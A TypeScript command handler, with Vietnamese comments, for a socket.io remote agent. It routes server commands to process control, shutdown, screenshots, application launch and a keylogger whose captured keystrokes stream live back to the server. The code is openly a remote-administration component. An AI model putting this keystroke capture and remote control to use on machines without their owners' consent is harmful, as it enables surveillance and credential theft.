// file: commandHandler.ts
import { Socket } from "socket.io-client";
import { AgentConfig } from "../config/env.js";
import { logger } from "../utils/logger.js";
import { listProcesses, killProcess } from "../services/processService.js";
import { shutdownSystem, restartSystem } from "../services/systemService.js";
import { takeScreenshot } from "../services/screenshotService.js";
import { getApplications, startApplication } from "../services/applicationService.js";

// ===> BƯỚC 1: IMPORT 2 HÀM TỪ KEYLOGSERVICE (Bỏ getKeylogPrint) <===
import {
    startKeylogHook,
    stopKeylogHook
    // getKeylogPrint đã bị xóa vì không cần nữa
} from '../services/keylogService.js';

import { RequestMessage, ResponseMessage } from "../protocol.js";

/**
 * Bảng ánh xạ command → handler
 */
const COMMAND_MAP: Record<string, (params?: any) => Promise<any>> = {
    'list_processes': listProcesses,
    'kill_process': async (p) => await killProcess(p?.pid),
    'system_shutdown': shutdownSystem,
    'system_restart': restartSystem,
    'take_screenshot': takeScreenshot,
    'list_applications': getApplications,
    'start_application': startApplication,

    // ===> BƯỚC 2: XÓA 2 LỆNH, GIỮ 1 LỆNH <===
    // 'keylog_start_hook': Bị xóa, sẽ xử lý riêng
    'keylog_stop_unhook': stopKeylogHook, // Vẫn dùng map vì nó đơn giản
    // 'keylog_print_logs': Bị xóa, không cần nữa
    // ===> KẾT THÚC BƯỚC 2 <===
};

/**
 * Xử lý lệnh từ server gửi đến.
 */
export async function handleCommand(
    socket: Socket,
    msg: RequestMessage,
    config: AgentConfig
) {
    logger.info(`Received command: ${msg.action}`);

    // ===> BƯỚC 3: XỬ LÝ ĐẶC BIỆT CHO 'keylog_start_hook' <===
    // Chúng ta phải xử lý riêng lệnh này vì nó cần truyền 'socket' vào
    if (msg.action === 'keylog_start_hook') {
        let responseStatus: ResponseMessage['status'] = 'ok';
        let responseError: ResponseMessage['error'] = null;
        let responsePayload: any = null;

        try {
            // 1. Định nghĩa hàm callback
            // Hàm này sẽ được gọi từ service mỗi khi có phím mới
            const emitKeyCallback = (key: string) => {
                // Gửi một sự kiện 'keylog_data' (ngoài luồng req/res)
                // Client sẽ lắng nghe sự kiện này
                socket.emit('keylog_data', key);
            };

            // 2. Gọi service và truyền callback vào
            const serviceResponse = await startKeylogHook(emitKeyCallback);

            // 3. Chuẩn bị phản hồi cho Client (chỉ là "Đã bắt đầu...")
            responsePayload = serviceResponse.message;
            if (serviceResponse.status !== 'ok') {
                responseStatus = 'error';
                responseError = { code: 'HOOK_FAILED', message: serviceResponse.message };
            }

        } catch (err: any) {
            responseStatus = 'error';
            responseError = { code: 'EXEC_FAILED', message: err.message || "Command failed" };
        }

        // 4. Gửi phản hồi một lần (Response) cho Client
        const response: ResponseMessage = {
            protocolVersion: '1.0',
            id: msg.id,
            type: 'response',
            status: responseStatus,
            payload: responsePayload,
            error: responseError,
            meta: {
                agentId: config.AGENT_ID,
                timestamp: Date.now(),
            },
        };
        socket.emit("response", response);

        // 5. Quan trọng: Dừng hàm tại đây
        return;
    }
    // ===> KẾT THÚC BƯỚC 3 <===


    // ===== CÁC LỆNH BÌNH THƯỜNG (dùng COMMAND_MAP) =====
    // Các lệnh khác (như stop, list_processes) sẽ chạy bình thường
    let result: any;
    let status: ResponseMessage['status'] = 'ok';
    let error: ResponseMessage['error'] = null;

    try {
        const handler = COMMAND_MAP[msg.action];
        if (handler) {
            result = await handler(msg.payload);
        } else {
            throw new Error(`Unknown command action: ${msg.action}`);
        }
    } catch (err: any) {
        status = 'error';
        error = { code: 'EXEC_FAILED', message: err.message || "Command failed" };
        result = null;
    }

    const response: ResponseMessage = {
        protocolVersion: '1.0',
        id: msg.id,
        type: 'response',
        status: status,
        payload: result,
        error: error,
        meta: {
            agentId: config.AGENT_ID,
            timestamp: Date.now(),
        },
    };

    socket.emit("response", response);
}